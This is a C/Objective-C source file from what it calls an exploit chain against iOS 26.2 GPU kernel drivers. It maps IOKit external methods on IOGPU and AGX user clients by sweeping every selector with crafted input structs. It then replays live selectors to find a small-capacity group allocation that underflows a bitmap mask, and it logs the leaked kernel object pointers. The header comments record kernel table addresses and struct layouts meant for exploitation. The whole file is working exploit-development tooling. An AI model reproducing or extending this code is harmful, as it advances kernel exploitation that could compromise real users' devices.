/* IOGPUFamily / AGXG14P external-method map for iOS 26.2 (23C55).
 *
 * PURPOSE
 *   One device run must answer: which external methods exist, on which
 *   user-client type, and what each returns. Everything else in the
 *   exploit chain depends on this map, and guessing is what cost us
 *   several build cycles.
 *
 *   Facts already established on device (do not re-derive):
 *     - AGXAcceleratorG14P type=1  -> 56/128 selectors exist (0..55)
 *     - IOGPU            type=33 -> 128/128 selectors exist (0..127)
 *     - IOGPU            type=1  -> 56/128   (0..55)
 *     - IOGPUFamily type=1 table @ 0xfffffff007e67c58 (n=112, stride 0x18)
 *       is TWO 56-entry tables back to back, not one 112-entry table.
 *     - sel 8 on type=1 answers KERN_SUCCESS and CREATES A GROUP:
 *         struct[0]=3 (resType group), struct[56]=capacity
 *         -> output+0x10 = kernel pointer of the group object
 *         -> capacity must be a power of two >= 64
 *            (capacity<64 -> kIOReturnNoResources, the underflowed
 *             bitmap mask makes the allocation impossible)
 *     - sel 64 on type=33 reaches the group dispatcher and refuses with
 *       kIOReturnError; its struct gate is size>=88 and outSize>=
 *       inScalar+88, and the lookup key (struct[56]) must resolve in the
 *       device resource list.
 *
 * WHAT THIS RUNS
 *   P1  for every candidate service name x every IOServiceOpen type:
 *       open, then sweep selectors 0..127 with a valid 256-byte struct
 *       (outCnt set to sizeof(out) — a zero outCnt means a NULL
 *       structureOutput and the handler bails before doing anything),
 *       recording the kern_return per (service,type,selector).
 *   P2  print a compact per-conn map: for each selector, the set of
 *       return codes seen, and a hex dump of the output for successes.
 *   P3  for every selector that returned KERN_SUCCESS, replay it with
 *       cmd in {0,1,2,3,64,130} and capacity in {1,32,63,64,128,4096}
 *       to find the one that creates a group with a small capacity.
 *
 * All output is mirrored into Documents/oob64.log (durable, fsync per line).
 */
#import <IOKit/IOKitLib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"
#include "nk_trace.h"
#include <stdarg.h>

#define ol(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
                            nk_doc_log("oob64.log", fmt, ##__VA_ARGS__); } while (0)

#define MAX_SVC   8
#define MAX_CONN  16
#define MAX_SEL   128
#define ST_SZ     256

static const char *g_svc_names[MAX_SVC] = {
    "IOGPU", "IOGPUDevice", "AGXAcceleratorG14P", "IOGPUFamily",
    "IOGPUDeviceUserClient", "AGXAccelerator", "IOGPUCommandQueue", "IOGPUChannel"
};
static const uint32_t g_types[] = { 1, 33, 2, 5, 0, 3, 4, 6 };
#define N_TYPES ((int)(sizeof(g_types)/sizeof(g_types[0])))

#define KRC_OK      0
#define KRC_FAIL    1
#define KRC_BADARG  2
#define KRC_UNSUP   3
#define KRC_OTHER   4
#define KRC_NCLASS  5

typedef struct {
    char     svc[64];
    uint32_t type;
    io_connect_t conn;
    uint8_t  kr_map[MAX_SEL][KRC_NCLASS];
    uint8_t  exists[MAX_SEL];
} conn_t;

static conn_t g_conns[MAX_CONN];
static uint32_t g_nconns;
static uint32_t g_calls;

static int kr_class(kern_return_t kr)
{
    if (kr == KERN_SUCCESS) return KRC_OK;
    if (kr == KERN_FAILURE) return KRC_FAIL;
    if (kr == (kern_return_t)0xe00002c2) return KRC_BADARG;
    if (kr == (kern_return_t)0xe00002c7) return KRC_UNSUP;
    return KRC_OTHER;
}

static const char *kr_name(kern_return_t kr)
{
    switch (kr) {
        case KERN_SUCCESS: return "OK";
        case KERN_FAILURE: return "FAIL";
        case 0xe00002c2: return "BADARG";
        case 0xe00002c7: return "UNSUP";
        case 0xe00002be: return "NORES";
        case 0xe00002c1: return "NOMEM";
        case 0xe00002bd: return "PRIV";
        case 0xe00002e3: return "BUSY";
        default: return "OTHER";
    }
}

static void build_struct(uint8_t *in, uint32_t cmd, uint32_t cap, int has_args)
{
    memset(in, 0, ST_SZ);
    uint64_t c = cmd;
    memcpy(in + 0, &c, 8);
    memcpy(in + 56, &cap, 4);
    uint64_t p2 = 0x1000, p3 = 0x1000, p4 = 0x1000;
    memcpy(in + 60, &p2, 8);
    memcpy(in + 68, &p3, 8);
    memcpy(in + 72, &p4, 8);
    uint64_t cap64 = cap;
    memcpy(in + 80, &cap64, 8);
    if (has_args) {
        static uint8_t args[64];
        memset(args, 0, sizeof(args));
        uintptr_t ap = (uintptr_t)args;
        memcpy(in + 24, &ap, 8);
    }
}

static kern_return_t call_sel(io_connect_t conn, uint32_t sel, uint8_t *in, uint32_t sz,
                              uint8_t *out, size_t *outn)
{
    return IOConnectCallStructMethod(conn, sel, in, sz, out, outn);
}

/* ------------------------------------------------------------------ */
static void p1_map(void)
{
    ol("[p1] external-method map: %d services x %d types x %d selectors",
       MAX_SVC, N_TYPES, MAX_SEL);
    static uint8_t in[ST_SZ];
    static uint8_t out[ST_SZ];

    for (int s = 0; s < MAX_SVC; s++) {
        CFMutableDictionaryRef m = IOServiceMatching(g_svc_names[s]);
        if (!m) continue;
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMasterPortDefault, m, &it) != KERN_SUCCESS) {
            ol("[p1] svc=%s enum FAIL", g_svc_names[s]);
            continue;
        }
        uint32_t nsvc = 0;
        io_service_t svc;
        while ((svc = IOIteratorNext(it))) {
            nsvc++;
            for (int t = 0; t < N_TYPES; t++) {
                io_connect_t c = MACH_PORT_NULL;
                if (IOServiceOpen(svc, mach_task_self(), g_types[t], &c) != KERN_SUCCESS || !c)
                    continue;
                if (g_nconns >= MAX_CONN) { IOServiceClose(c); continue; }
                conn_t *cn = &g_conns[g_nconns];
                snprintf(cn->svc, sizeof(cn->svc), "%s", g_svc_names[s]);
                cn->type = g_types[t];
                cn->conn = c;
                g_nconns++;
                ol("[p1] OPEN %s type=%u -> conn[%u]", cn->svc, cn->type, g_nconns - 1);
            }
        }
        ol("[p1] svc=%s services=%u", g_svc_names[s], nsvc);
    }

    for (uint32_t ci = 0; ci < g_nconns; ci++) {
        conn_t *cn = &g_conns[ci];
        for (uint32_t sel = 0; sel < MAX_SEL; sel++) {
            build_struct(in, 130, 64, 0);
            size_t outn = sizeof(out);
            kern_return_t kr = call_sel(cn->conn, sel, in, ST_SZ, out, &outn);
            g_calls++;
            int kc = kr_class(kr);
            cn->kr_map[sel][kc] = 1;
            if (kc != KRC_UNSUP) cn->exists[sel] = 1;
            if (kc == KRC_OK || kc == KRC_OTHER) {
                ol("[p1] HIT conn[%u] %s type=%u sel=%u kr=0x%x (%s) outN=%zu",
                   ci, cn->svc, cn->type, sel, kr, kr_name(kr), outn);
                if (kc == KRC_OK) {
                    for (uint32_t w = 0; w + 8 <= 64; w += 8) {
                        uint64_t v = 0;
                        memcpy(&v, out + w, 8);
                        if (v) ol("[p1]    out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
                    }
                }
            }
            usleep(250);
        }
    }
}

/* ------------------------------------------------------------------ */
static void p2_report(void)
{
    ol("[p2] per-conn selector map");
    for (uint32_t ci = 0; ci < g_nconns; ci++) {
        conn_t *cn = &g_conns[ci];
        uint32_t alive = 0;
        for (uint32_t s = 0; s < MAX_SEL; s++) if (cn->exists[s]) alive++;
        ol("[p2] conn[%u] %s type=%u : %u/%u exist", ci, cn->svc, cn->type, alive, MAX_SEL);
        for (uint32_t s = 0; s < MAX_SEL; s++) {
            if (!cn->exists[s]) continue;
            char buf[64] = {0};
            if (cn->kr_map[s][KRC_OK])   strcat(buf, "OK,");
            if (cn->kr_map[s][KRC_FAIL]) strcat(buf, "FAIL,");
            if (cn->kr_map[s][KRC_BADARG]) strcat(buf, "BADARG,");
            if (cn->kr_map[s][KRC_OTHER]) strcat(buf, "OTHER,");
            ol("[p2]   sel=%3u : %s", s, buf);
        }
    }
}

/* ------------------------------------------------------------------ */
static void p3_replay(void)
{
    ol("[p3] replay of live selectors with cmd/capacity sweep");
    static uint8_t in[ST_SZ];
    static uint8_t out[ST_SZ];
    static const uint32_t cmds[] = { 0, 1, 2, 3, 64, 130 };
    static const uint32_t caps[] = { 1, 2, 8, 16, 32, 63, 64, 128, 4096 };

    for (uint32_t ci = 0; ci < g_nconns; ci++) {
        conn_t *cn = &g_conns[ci];
        for (uint32_t sel = 0; sel < MAX_SEL; sel++) {
            if (!cn->exists[sel]) continue;
            for (uint32_t c = 0; c < sizeof(cmds)/sizeof(cmds[0]); c++) {
                for (uint32_t k = 0; k < sizeof(caps)/sizeof(caps[0]); k++) {
                    build_struct(in, cmds[c], caps[k], 1);
                    size_t outn = sizeof(out);
                    kern_return_t kr = call_sel(cn->conn, sel, in, ST_SZ, out, &outn);
                    g_calls++;
                    if (kr == KERN_SUCCESS) {
                        uint64_t v16 = 0;
                        memcpy(&v16, out + 0x10, 8);
                        ol("[p3] *** conn[%u] %s type=%u sel=%u cmd=%u cap=%u outN=%zu grp=0x%016llx",
                           ci, cn->svc, cn->type, sel, cmds[c], caps[k], outn,
                           (unsigned long long)v16);
                    } else if (kr_class(kr) == KRC_OTHER) {
                        ol("[p3] *** conn[%u] %s type=%u sel=%u cmd=%u cap=%u kr=0x%x (%s)",
                           ci, cn->svc, cn->type, sel, cmds[c], caps[k], kr, kr_name(kr));
                    }
                    usleep(200);
                }
            }
        }
    }
}

void nk_iogpu_oob64_run(void)
{
    nk_doc_log_open("oob64.log");
    ol("[oob64] === external-method map run (23C55) ===");
    g_calls = 0; g_nconns = 0;
    memset(g_conns, 0, sizeof(g_conns));

    p1_map();
    p2_report();
    p3_replay();

    ol("[oob64] done: calls=%u conns=%u", g_calls, g_nconns);
}
